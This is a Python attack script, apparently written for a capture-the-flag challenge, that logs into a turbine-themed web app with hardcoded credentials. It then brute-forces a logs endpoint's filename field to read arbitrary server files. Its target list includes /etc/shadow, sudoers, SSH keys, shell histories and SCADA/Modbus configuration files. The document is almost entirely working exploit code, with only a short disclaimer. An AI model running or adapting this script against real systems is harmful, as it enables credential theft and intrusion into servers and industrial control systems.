# Created with ChatGPT for a CTF challenge
# Purpose: Brute-force directory paths on hidden log pages
# Use only in Capture The Flag (CTF) scenarios
# Unauthorized use may violate terms of service
import requests

# Configuration
base_url = "http://192.168.56.108:5900"  # Replace with the actual URL
login_url = f"{base_url}/login"
logs_url = f"{base_url}/logs"

# Common directories and filenames to brute-force
directories = [
    "/", "/etc/", "/var/", "/home/", "/usr/", "/tmp/", "/root/", "/var/log/",
    "/bin/", "/sbin/", "/lib/", "/lib64/", "/opt/", "/mnt/", "/media/", "/srv/",
    "/sys/", "/dev/", "/proc/", "/boot/", "/run/", "/usr/local/", "/usr/share/",
    "/etc/modbus/", "/etc/scada/", "/var/scada/", "/var/log/modbus/", "/var/log/scada/",
    "/opt/scada/", "/opt/modbus/", "/home/scada/", "/home/modbus/", "/etc/modbus.d/",
    "/var/lib/scada/", "/usr/local/scada/"
]

# Common filenames for both Linux and SCADA/Modbus systems
filenames = [
    "passwd", "shadow", "group", "hostname", "network/interfaces", "hosts", "resolv.conf",
    ".bash_history", ".bashrc", ".profile", "authorized_keys", "crontab", "dmesg",
    "ssh/sshd_config", "crontab", "sysctl.conf", "inputrc", "sudoers", ".bash_logout",
    "fstab", "rc.local", "motd", "issue", "apache2.conf", "nginx.conf", "httpd.conf",
    "my.cnf", "php.ini", "mysql_config", "nginx.conf", "iptables", "logrotate.conf",
    "rsyslog.conf", "cron.d", "cron.daily", "cron.hourly", "cron.monthly", "cron.weekly",
    "dbus.conf", "syslog.conf", ".bash_profile", ".zshrc", "ssh_config", ".profile", ".gitconfig",
    "auth.log", "syslog", "kern.log", "messages", "dmesg", "debug", "lastlog", "wtmp", "btmp",
    "modbus.cfg", "scada.cfg", "modbus-config.txt", "scada-config.txt", "modbus_log.txt", 
    "scada_log.txt", "modbus_connection.log", "scada_events.log", "modbus_error.log", 
    "scada_database.db", "modbus_communications.db", "modbus_params.ini", "scada_params.ini",
    "modbus_config.json", "scada_config.json", "modbus_settings.conf", "scada_settings.conf",
    "modbus_history.log", "scada_history.log", "modbus_status.log", "scada_status.log",
    "modbus_user_config.ini", "scada_user_config.ini", "scada_config.xml", "modbus_config.xml"
]

# Login credentials
username = "MyTurbine"
password = "m442+SRt"

def login():
    session = requests.Session()
    
    # Send POST request to login
    login_payload = {
        "username": username,  # Match the input field name 'username'
        "password": password   # Match the input field name 'password'
    }
    response = session.post(login_url, data=login_payload)
    
    # Check if login is successful (assuming status code 200 is success)
    if response.status_code == 200 and "login" not in response.url:  # Adjust success criteria if needed
        print("[+] Logged in successfully!")
        return session
    else:
        print("[-] Login failed!")
        return None

def brute_force_files(session):
    for directory in directories:
        for filename in filenames:
            full_path = f"{directory}{filename}"
            print(f"Testing: {full_path}")
            
            # Send POST request to the /logs endpoint to check if the file exists
            response = session.post(
                logs_url,
                data={"filename": full_path}
            )
            
            # Check if the response suggests the file exists
            if response.status_code == 200 and "Error" not in response.text:
                print(f"[+] File found: {full_path}")
                print(f"Response:\n{response.text}")
                return full_path  # Exit on first successful file discovery
            elif response.status_code != 200:
                print(f"[-] HTTP Error for {full_path}: {response.status_code}")
            else:
                print(f"[-] File not found: {full_path}")

    print("Bruteforce completed. No files discovered.")
    return None

# Main logic
if __name__ == "__main__":
    # Step 1: Login to the system
    session = login()
    
    if session:
        # Step 2: Perform file bruteforce after login
        found_file = brute_force_files(session)
        if found_file:
            print(f"File discovered: {found_file}")
        else:
            print("No files discovered.")
    else:
        print("Login failed. Exiting script.")
